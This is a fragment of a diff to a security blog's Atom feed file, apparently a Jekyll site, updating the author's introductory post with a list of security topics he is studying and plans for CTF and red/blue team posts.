+&lt;p&gt;That’s all folks! I hope you enjoy this post and see you in the next one.&lt;/p&gt;</content><author><name></name></author><category term="IOS_Security_Tutorial" /><summary type="html">Hello world!</summary></entry><entry><title type="html">Welcome to MobAppSec-Blog!</title><link href="http://localhost:4000/blog/food_for_thought/2020/12/03/hello_world.html" rel="alternate" type="text/html" title="Welcome to MobAppSec-Blog!" /><published>2020-12-03T14:44:25+07:00</published><updated>2020-12-03T14:44:25+07:00</updated><id>http://localhost:4000/blog/food_for_thought/2020/12/03/hello_world</id><content type="html" xml:base="http://localhost:4000/blog/food_for_thought/2020/12/03/hello_world.html">&lt;p&gt;Hello world! For my first post, I think it’s a good idea to introduce this blog and what kinda content that will be released for now and for the future. Little bit of myself, My name is williams from Indonesia and I currently work as independent security consultant(Mostly doing Mobile Application Penetration Testing). I create this blog to share what I thought to be interesting and useful for doing real life mobile application security testing, exploitation, learning new technology and also this blog would be indirectly used as a cheatsheet of mine if I ever forget some POC that I have done earlier, mostly this blog will cover about mobile application security, this include:&lt;/p&gt;
 
 &lt;ul&gt;
   &lt;li&gt;
@@ -1069,12 +1353,23 @@ hello world!&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
   &lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;p&gt;Each of this area will get seperate section of categories so it will be much more easier to navigate. Furthermore, the blog format and design will be continuously updated. Finally, I have an old blogger(&lt;a href=&quot;https://court-of-testing-analysing.blogspot.com/&quot;&gt;old blog&lt;/a&gt;) that cover some of this materials but it will not be extensive and detail as this. You may be asking, why I left my old blog?&lt;/p&gt;
+&lt;p&gt;Currently Learning:&lt;/p&gt;
 
-&lt;ol&gt;
-  &lt;li&gt;Because I want to have a fresh start&lt;/li&gt;
-  &lt;li&gt;I think blogger have kinda pale design so its kinda not suit for my taste&lt;/li&gt;
-  &lt;li&gt;I want to challenge myself by using a new framework to create a blog&lt;/li&gt;
-&lt;/ol&gt;
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;Blockchain Security&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Browser Exploitation&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Windows Exploit Development(OSED)&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Flutter Reverse Engineering&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
 
-&lt;p&gt;That’s all I think it’s enough for introduction and I hope you enjoy this blog, cheers!&lt;/p&gt;</content><author><name></name></author><category term="food_for_thought" /><summary type="html">Hello world! For my first post, I think it’s a good idea to introduce this blog and what kinda content that will be released for now and for the future. Little bit of myself, My name is williams from Indonesia and I currently work as independent security consultant(Mostly doing Mobile Application Penetration Testing). I create this blog to share what I thought to be interesting and useful for doing real life mobile application security testing and also this blog would be indirectly used as a cheatsheet of mine if I ever forget some POC that I have done earlier, mostly this blog will cover about mobile application security, this include:</summary></entry></feed>
+&lt;p&gt;Each of this area will get seperate section of categories so it will be much more easier to navigate. Furthermore, the blog format and design will be continuously updated. Finally, I have an old blogger(&lt;a href=&quot;https://court-of-testing-analysing.blogspot.com/&quot;&gt;old blog&lt;/a&gt;). I will used this to post more CTF, red team and blue team stuff.&lt;/p&gt;
+
+&lt;p&gt;That’s all I think it’s enough for introduction and I hope you enjoy this blog, cheers!&lt;/p&gt;</content><author><name></name></author><category term="food_for_thought" /><summary type="html">Hello world! For my first post, I think it’s a good idea to introduce this blog and what kinda content that will be released for now and for the future. Little bit of myself, My name is williams from Indonesia and I currently work as independent security consultant(Mostly doing Mobile Application Penetration Testing). I create this blog to share what I thought to be interesting and useful for doing real life mobile application security testing, exploitation, learning new technology and also this blog would be indirectly used as a cheatsheet of mine if I ever forget some POC that I have done earlier, mostly this blog will cover about mobile application security, this include:</summary></entry></feed>
